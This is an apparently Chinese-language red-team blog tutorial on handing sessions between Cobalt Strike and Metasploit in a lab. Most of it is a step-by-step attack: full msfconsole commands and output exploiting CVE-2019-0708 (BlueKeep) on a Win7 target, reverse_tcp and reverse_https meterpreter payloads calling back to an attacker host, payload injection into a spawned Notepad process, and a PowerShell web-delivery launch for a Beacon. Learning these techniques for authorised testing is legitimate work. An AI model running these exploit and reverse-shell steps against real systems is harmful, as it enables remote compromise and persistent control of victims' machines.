---
title: 【经验总结】CS与MSF之间的会话传递
date: 2021-01-29 19:17:14
id: 210129-191714
img: https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2020-07-26_19-11-30.png
tags:
- Cobalt Strike
- MSF
- 经验总结
categories:
- 经验总结
---

# 0x00 前言

众所周知，Cobalt Strike 的前身是 Armitage，而 Armitage 又可以理解为 Metasploit  Framework 的图形界面版，因此 Cobalt Strike 与 Metasploit  Framework 在很多地方都是兼容的，所以我们便可以将 Metasploit  Framework 攻击产生的会话传递到 Cobalt Strike 上，同样的 Cobalt Strike 的会话也能够传递到 Metasploit  Framework



**Metasploit  Framework 会话传递到 Cobalt Strike 上整体过程如下：**

1、Metasploit Framework 调用攻击载荷，这里调用的是喜闻乐见的 CVE-2019-0708

2、Metasploit Framework 发起攻击，获取会话

3、Cobalt Strike 新建一个 Beacon，这里使用的是 HTTPS Beacon

4、最后，在 Metasploit Framework 上调用 exploit/windows/local/payload_inject 模块

5、在该模块上配置与 Cobalt Strike 上为同样类型的 payload，即 HTTPS Payload，设置 Cobalt Strike 服务器的 IP 和 端口后运行即可



**Cobalt Strike 会话传递到 Metasploit  Framework 上整体过程如下：**

1、首先，Cobalt Strike 需要获得一个会话，这里直接采用 Scripted Web Delivery（S）的方式使靶机上线

2、接着，Metasploit Framework 调用 exploit/multi/handler 模块

3、在该模块上配置 HTTP Payload，为该 payload 的 IP 和 端口设置成 Metasploit Framework 所在主机 IP，端口自定义即可

4、 之后运行该模块

5、在 Cobalt Strike 上创建一个 Foreign HTTP 的监听，监听 IP 和端口设置成刚才 Metasploit Framework 上所监听的 IP 和端口

7、接着在 Cobalt Strike 上右击选择要传递的会话，找到 Spawn 选项，选择刚刚创建的监听器即可

> 环境信息：
>
> 攻击 IP：192.168.175.200 （Cobalt Strike 服务端、Metasploit Framework 所在主机）
>
> 靶机 IP：192.168.175.177 （一台有 CVE-2019-0708 漏洞的 Win7 SP1 64 位靶机）

# 0x01 Metasploit Framework 会话传递到 Cobalt Strike 

## 1、Cobalt Strike 上的操作

首先来到 Cobalt Strike 目录下，启动 Cobalt Strike 服务端

```
./teamserver yourip yourpassword
```

之后打开 Cobalt Strike 客户端进行连接

```
./start.sh
```

输入服务端密码连接上之后，点击 Cobalt Strike --> Listeners 打开 Listeners 界面，点击下方的 Add 按钮，输入 Beacon 名称，这里选择的是 HTTPS Beacon，添加上主机 IP，点击保存，即可创建一个 HTTPS Beacon

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2020-07-24_20-07-57.png)

## 2、Metasploit Framework 上的操作

首先，打开 Metasploit Framework

```
msfconsole 
```

调用 CVE-2019-0708 模块

```
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

设置靶机 IP

```
set rhost 192.168.175.177
```

设置 Payload

```
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.175.200
```

发起攻击

```
exploit
```

整体过程如下：

```
root@kali:~# msfconsole

msf5 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set rhost 192.168.175.177
rhost => 192.168.175.177

msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp

msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set lhost 192.168.175.200
lhost => 192.168.175.200

msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > exploit
[*] Started reverse TCP handler on 192.168.175.200:4444 
[*] 192.168.175.177:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
[+] 192.168.175.177:3389  - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 192.168.175.177:3389  - Scanned 1 of 1 hosts (100% complete)
[*] 192.168.175.177:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8028608000, Channel count 1.
[!] 192.168.175.177:3389 - <---------------- | Entering Danger Zone | ---------------->
[*] 192.168.175.177:3389 - Surfing channels ...
[*] 192.168.175.177:3389 - Lobbing eggs ...
[*] 192.168.175.177:3389 - Forcing the USE of FREE'd object ...
[!] 192.168.175.177:3389 - <---------------- | Leaving Danger Zone | ---------------->
[*] Sending stage (206403 bytes) to 192.168.175.177
[*] Meterpreter session 4 opened (192.168.175.200:4444 -> 192.168.175.177:49167) at 2020-07-26 05:57:22 -0400

meterpreter > 
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2020-07-26_17-57-47.png)

## 3、开始传递会话

首先，backgroud 会话

```
background
```

调用 payload_inject 模块

```
use exploit/windows/local/payload_inject
```

设置 HTTPS Payload

```
set payload windows/meterpreter/reverse_https
```

设置 lhost 和 lport 为 Cobalt Strike 的监听 IP 与端口

```
set lhost 192.168.175.200
set lport 443
```

设置 DisablePayloadHandler 为 True，此选项会让 Metasploit Framework 避免在其内起一个 handler 来服务你的 payload 连接，也就是告诉 Metasploit Framework 说我们已经建立了监听器，不必再新建监听器了。

```
set DisablePayloadHandler True
```

（可选）设置 PrependMigrate 为 True，此选项让 Metasploit Framework 前置 shellcode 在另一个进程中运行 payload stager，如果被利用的应用程序崩溃或被用户关闭，这会帮助 Beacon 会话存活。

```
set PrependMigrate True
```

设置要传递的会话 session，如果不知道自己的 session id，可以通过 sessions -l 查看，我这里待传递的 session id 为 4

```
 set session 4
```

开始会话传递

```
run
```

整体过程如下：

```
msf5 > background 
[*] Backgrounding session 4...

msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > use exploit/windows/local/payload_inject

msf5 exploit(windows/local/payload_inject) > set payload windows/meterpreter/reverse_https
payload => windows/meterpreter/reverse_https

msf5 exploit(windows/local/payload_inject) > set lhost 192.168.175.200
lhost => 192.168.175.200

msf5 exploit(windows/local/payload_inject) > set lport 443
lport => 443

msf5 exploit(windows/local/payload_inject) > set DisablePayloadHandler True
DisablePayloadHandler => true

msf5 exploit(windows/local/payload_inject) > set PrependMigrate True
PrependMigrate => True

msf5 exploit(windows/local/payload_inject) >  set session 4
session => 4

msf5 exploit(windows/local/payload_inject) > run
[*] Running module against WIN-T0UES7KBMJ5
[*] Spawned Notepad process 544
[*] Injecting payload into 544
[*] Preparing 'windows/meterpreter/reverse_https' for PID 544
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2020-07-26_19-11-30.png)

此时，来到 Cobalt Strike 下已经可以看到传递过来的会话了

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2020-07-26_18-08-39.png)

# 0x02 Cobalt Strike 会话传递到 Metasploit Framework 

## 1、Cobalt Strike 上的操作

与上述 Cobalt Strike 的操作步骤一样，这里先创建一个 HTTPS Beacon，接下来创建一个 Powershell 类型的 Scripted Web Delivery（S）

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2020-07-26_18-27-02.png)为了使 Cobalt Strike 获得一个会话，需要复制创建好的命令，并在靶机上运行，此时靶机便会上线了

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2020-07-26_18-30-31.png)

## 2、Metasploit Framework 上的操作

首先，在 Metasploit Framework 上调用 handler 模块

```
use exploit/multi/handler
```

设置 HTTP Payload

```
set payload windows/meterpreter/reverse_http
set lhost 192.168.175.200
set lport 4480
```

运行该模块

```
run
```

整体过程如下：

```
msf5 > use exploit/multi/handler

msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
payload => windows/meterpreter/reverse_http

msf5 exploit(multi/handler) > set lhost 192.168.175.200
lhost => 192.168.175.200

msf5 exploit(multi/handler) > set lport 4480
lport => 4480

msf5 exploit(multi/handler) > run
[*] Started HTTPS reverse handler on http://192.168.175.200:4480
```

## ![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2020-07-26_18-35-45.png)3、开始会话传递

在 Cobalt Strike 上先创建一个  Foreign HTTP 监听，IP 和 端口设置成上面 Metasploit Framework 所设置 handler 模块的端口和 IP

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2020-07-26_18-39-58.png)

之后在 Cobalt Strike 上右击待传递的会话选择 Spawn ，选择刚刚创建的 Foreign HTTP 监听

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2020-07-26_18-54-23.png)

来到 Metasploit Framework 便能够看到会话已经传递过来了

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2020-07-26_18-57-35.png)

> 更多信息欢迎关注我的微信公众号：TeamsSix
>

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png)